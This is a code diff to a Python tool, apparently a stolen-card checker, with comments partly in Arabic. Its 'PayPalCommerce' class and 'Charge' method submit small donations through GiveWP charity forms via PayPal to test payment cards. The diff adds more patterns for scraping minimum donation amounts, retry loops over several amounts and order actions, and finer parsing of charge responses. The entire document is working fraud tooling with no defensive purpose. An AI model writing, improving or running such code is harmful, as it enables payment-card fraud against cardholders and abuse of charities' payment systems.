@@ -106,7 +106,7 @@ async def get_bin_info(bin_number):
         await asyncio.sleep(0.5)
     return "Unknown", "Unknown", "Unknown"
 
-# ===================== PAYPAL COMMERCE CLASS (FINAL) =====================
+# ===================== PAYPAL COMMERCE CLASS (FINAL V2) =====================
 
 class PayPalCommerce:
     def __init__(self, target_url):
@@ -201,7 +201,6 @@ class PayPalCommerce:
             'give_email': self.email,
             'email': self.email,
             'give-gateway': 'paypal-commerce',
-            'give_title': 'Mr',
             'give_company': '',
             'give_comment': '',
             'give_anonymous': '0',
@@ -217,7 +216,8 @@ class PayPalCommerce:
                 r'minimum donation amount of &euro;([\d.]+)',
                 r'minimum donation amount of €([\d.]+)',
                 r'minimum donation amount of £([\d.]+)',
-                r'min donation amount[:=]\s*["\']?([\d.]+)',
+                r'minimum donation amount[^\d]*([\d.]+)',
+                r'min(?:imum)? (?:donation|amount)[^\d]*\$?([\d.]+)',
                 r'data-min-amount=["\']([\d.]+)["\']',
                 r'data-minimum-amount=["\']([\d.]+)["\']',
                 r'min-amount=["\']([\d.]+)["\']',
@@ -227,27 +227,38 @@ class PayPalCommerce:
                 r'min-donation=["\']([\d.]+)["\']',
                 r'data-minimum-donation=["\']([\d.]+)["\']',
                 r'minimum-donation=["\']([\d.]+)["\']',
+                r'give_min_amount["\']?\s*[:=]\s*["\']([\d.]+)',
+                r'minAmount["\']?\s*[:=]\s*["\']([\d.]+)',
+                r'min_amount["\']?\s*[:=]\s*["\']([\d.]+)',
+                r'This form has a minimum donation amount of \$([\d.]+)',
+                r'This form has a minimum donation amount of &euro;([\d.]+)',
             ]
             for pattern in patterns:
                 match = re.search(pattern, html, re.IGNORECASE)
                 if match:
-                    self.minimum_amount = match.group(1)
-                    return
+                    amount = match.group(1)
+                    try:
+                        float(amount)
+                        self.minimum_amount = amount
+                        return
+                    except:
+                        continue
             
             min_inputs = re.findall(r'<input[^>]*min=["\']([\d.]+)["\'][^>]*>', html, re.IGNORECASE)
             if min_inputs:
                 self.minimum_amount = max(min_inputs, key=float)
                 return
             
-            js_vars = re.findall(r'(?:var|let|const)\s+\w*(?:min|minimum)\w*\s*=\s*["\']?([\d.]+)', html, re.IGNORECASE)
-            if js_vars:
-                self.minimum_amount = max(js_vars, key=float)
-                return
-            
-            all_mins = re.findall(r'min(?:imum)?[^=]*=\s*["\']?([\d.]+)', html, re.IGNORECASE)
-            if all_mins:
-                self.minimum_amount = max(all_mins, key=float)
-                return
+            js_patterns = [
+                r'(?:var|let|const)\s+\w*(?:min|minimum)\w*\s*=\s*["\']?([\d.]+)',
+                r'min(?:imum)?(?:_amount|Amount)?\s*[:=]\s*["\']?([\d.]+)',
+                r'minimum\s*[:=]\s*["\']?([\d.]+)',
+            ]
+            for pattern in js_patterns:
+                matches = re.findall(pattern, html, re.IGNORECASE)
+                if matches:
+                    self.minimum_amount = max(matches, key=float)
+                    return
             
             self.minimum_amount = "1.00"
         except:
@@ -390,11 +401,12 @@ class PayPalCommerce:
     def _create_order_givewp(self):
         if not self.ajax_url:
             return None
-        data_variations = [
-            self.get_base_form_data(),
-            {**self.get_base_form_data(), 'give-amount': self.donation},
-            {**self.get_base_form_data(), 'amount': self.donation},
-        ]
+        
+        amounts_to_try = []
+        if self.minimum_amount and self.minimum_amount != "1.00":
+            amounts_to_try.append(self.minimum_amount)
+        amounts_to_try.extend(["5.00", "10.00", "18.50", "25.00", "36.50", "50.00"])
+        
         headers = {
             'user-agent': self.get_next_ua(),
             'accept': 'application/json, text/javascript, */*; q=0.01',
@@ -403,8 +415,14 @@ class PayPalCommerce:
             'referer': f'https://{self.url}{self.inurl}',
             'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
         }
+        
         actions = ['give_paypal_commerce_create_order', 'give_create_order', 'create_order']
-        for form_data in data_variations:
+        
+        for amount in amounts_to_try:
+            form_data = self.get_base_form_data()
+            form_data['give-amount'] = amount
+            form_data['amount'] = amount
+            
             for action in actions:
                 params = {'action': action}
                 try:
@@ -427,6 +445,7 @@ class PayPalCommerce:
                             pass
                 except:
                     continue
+        
         return None
 
     def _create_order_direct(self):
@@ -508,7 +527,12 @@ class PayPalCommerce:
     def _approve_order_givewp(self, order_id):
         if not self.ajax_url:
             return None
-        form_data = self.get_base_form_data()
+        
+        amounts_to_try = []
+        if self.minimum_amount and self.minimum_amount != "1.00":
+            amounts_to_try.append(self.minimum_amount)
+        amounts_to_try.extend(["5.00", "10.00", "18.50", "25.00", "36.50", "50.00"])
+        
         headers = {
             'user-agent': self.get_next_ua(),
             'accept': 'application/json, text/javascript, */*; q=0.01',
@@ -517,16 +541,48 @@ class PayPalCommerce:
             'referer': f'https://{self.url}{self.inurl}',
             'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
         }
+        
         actions = ['give_paypal_commerce_approve_order', 'give_approve_order', 'approve_order']
-        for action in actions:
-            params = {'action': action, 'order': order_id}
-            try:
-                response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, cookies=self.cookies, timeout=15)
-                if response.status_code == 200:
-                    return response
-            except:
-                continue
+        
+        for amount in amounts_to_try:
+            form_data = self.get_base_form_data()
+            form_data['give-amount'] = amount
+            form_data['amount'] = amount
+            
+            for action in actions:
+                params = {'action': action, 'order': order_id}
+                try:
+                    response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, cookies=self.cookies, timeout=15)
+                    if response.status_code == 200:
+                        return response
+                except:
+                    continue
+        
         return None
+
+    def _is_name_response(self, text):
+        """التحقق إذا كان النص مجرد اسم شخص"""
+        text_strip = text.strip()
+        
+        # لو النص اسم واحد
+        if text_strip in self.first_name or text_strip in self.last_name:
+            return True
+        
+        # لو النص اسمين (first + last)
+        for fn in self.first_name:
+            for ln in self.last_name:
+                if text_strip == f"{fn} {ln}":
+                    return True
+        
+        # لو النص فيه اسم بس ومفيش أي كلمات PayPal
+        paypal_keywords = ['error', 'declined', 'insufficient', 'approved', 'charge', 'true', 'invalid', 'amount', 'order', 'payer', 'card', 'payment', 'issue', 'name', 'message', 'details', 'description', 'minimum', 'donation', 'address', 'city', 'state', 'zip', 'phone', 'title', 'prefix']
+        
+        if len(text_strip) < 100:
+            has_keyword = any(k in text_strip.lower() for k in paypal_keywords)
+            if not has_keyword:
+                return True
+        
+        return False
 
     def Charge(self, ccx):
         try:
@@ -657,15 +713,19 @@ class PayPalCommerce:
                 text_lower = text.lower()
                 text_strip = text.strip()
                 
+                # CHARGE حقيقي
                 if 'true' in text_lower:
                     return 'CHARGE 1.0'
+                
+                # ORDER_NOT_APPROVED
                 if 'order_not_approved' in text_lower:
                     return "Payer cannot pay for this transaction."
-                if text_strip in self.first_name + self.last_name:
-                    return "PAYER_ACTION_REQUIRED"
-                if len(text_strip) < 50 and not any(k in text_lower for k in ['error', 'declined', 'insufficient', 'approved', 'charge', 'true', 'invalid', 'amount', 'order', 'payer', 'card', 'payment']):
+                
+                # التحقق من الاسم (حل مشكلة Michael Williams)
+                if self._is_name_response(text):
                     return "PAYER_ACTION_REQUIRED"
                 
+                # استخراج الرد الفعلي
                 try:
                     approve_json = approve_res.json()
                     if isinstance(approve_json, dict):
